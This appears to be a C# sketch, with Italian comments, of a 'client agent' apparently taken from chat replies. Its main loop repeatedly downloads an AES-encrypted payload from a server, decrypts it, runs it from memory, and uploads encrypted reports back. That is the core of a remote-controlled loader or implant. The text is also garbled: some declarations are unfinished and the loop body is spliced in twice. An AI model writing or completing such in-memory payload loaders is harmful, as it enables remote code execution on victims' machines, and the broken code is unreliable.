// Client agent sketch (vedi dettagli in risposte precedenti)

byte[] AesDecrypt(byte[] cipherText, byte[] key, byte[] iv) { ... }
byte[] AesEncrypt(byte[] plain, byte[] key, byte[] iv) { ... }
bool ExecuteFromMemory(byte[] asmBytes) { ... }
Task<byte[]> DownloadPayloadAsync(string url, string jwt) { ... }
Task UploadReportAsync(string url, byte[] encryptedReport, string jwt) { ... }
// Retry e logging senza password in chiaro

// Compress report batch con GZip
byte[] GZipCompress(byte[] data)
{
    using MemoryStream ms = new();
    using (var gzip = new System.IO.Compression.GZipStream(ms, System.IO.Compression.CompressionMode.Compress))
    {
        gzip.Write(data, 0, data.Length);
    }
    return ms.ToArray();
}
// Main loop
async Task MainLoopAsync()
{
    string serverUrl = "http://server/payload";
    string uploadUrl = "http://server/upload";
    string
    string
    byte[] aesKey = ...; // Pre-shared or derived key
    byte[] aesIv = ...;  // Pre-shared or derived IV
    string jwtToken = ...; // JWT for authentication
    int maxRetries = 3;
    int retryDelayMs = 2000;
    List<byte[]> reportBatch = new();
    while (true)
    {
        byte[] payload = null;
        for (int attempt = 0; attempt < maxRetries; attempt++)
        {
            try
            {
                payload = await DownloadPayloadAsync(serverUrl, jwtToken);
                if (payload != null) break;
            }
            catch { await Task.Delay(retryDelayMs); }
        }
        if (payload == null) { await Task.Delay(10000); continue; }

        byte[] decryptedPayload = AesDecrypt(payload, aesKey, aesIv);
        if (decryptedPayload == null) { await Task.Delay(10000); continue; }

        bool execSuccess = ExecuteFromMemory(decryptedPayload);
        byte[] report = System.Text.Encoding.UTF8.GetBytes(execSuccess ? "Success" : "Failure");
        reportBatch.Add(report);

        if (reportBatch.Count >= 5)
        {
            byte[] batchData = System.Text.Encoding.UTF8.GetBytes(string.Join("\n", reportBatch));
            byte[] compressedData = GZipCompress(batchData);
            byte[] encryptedReport = AesEncrypt(compressedData, aesKey, aesIv);

            for (int attempt = 0; attempt < maxRetries; attempt++)
            {
                try
                {
                    await UploadReportAsync(uploadUrl, encryptedReport, jwtToken);
                    reportBatch.Clear();
                    break;
                }
                catch { await Task.Delay(retryDelayMs); }
            }
        }
        await Task.Delay(5000);
    }
} jwtToken = ...; // JWT for authentication
    byte[] aesKey = ...; // Pre-shared or derived key
    byte[] aesIv = ...;  // Pre-shared or derived IV
    int maxRetries = 3;  
    int retryDelayMs = 2000;
    List<byte[]> reportBatch = new();
    while (true)
    {
        byte[] payload = null;
        for (int attempt = 0; attempt < maxRetries; attempt++)
        {
            try
            {
                payload = await DownloadPayloadAsync(serverUrl, jwtToken);
                if (payload != null) break;
            }
            catch { await Task.Delay(retryDelayMs); }
        }
        if (payload == null) { await Task.Delay(10000); continue; }

        byte[] decryptedPayload = AesDecrypt(payload, aesKey, aesIv);
        if (decryptedPayload == null) { await Task.Delay(10000); continue; }

        bool execSuccess = ExecuteFromMemory(decryptedPayload);
        byte[] report = System.Text.Encoding.UTF8.GetBytes(execSuccess ? "Success" : "Failure");
        reportBatch.Add(report);

        if (reportBatch.Count >= 5)
        {
            byte[] batchData = System.Text.Encoding.UTF8.GetBytes(string.Join("\n", reportBatch));
            byte[] compressedData = GZipCompress(batchData);
            byte[] encryptedReport = AesEncrypt(compressedData, aesKey, aesIv);

            for (int attempt = 0; attempt < maxRetries; attempt++)
            {
                try
                {
                    await UploadReportAsync(uploadUrl, encryptedReport, jwtToken);
                    reportBatch.Clear();
                    break;
                }
                catch { await Task.Delay(retryDelayMs); }
            }
        }
        await Task.Delay(5000);
    }
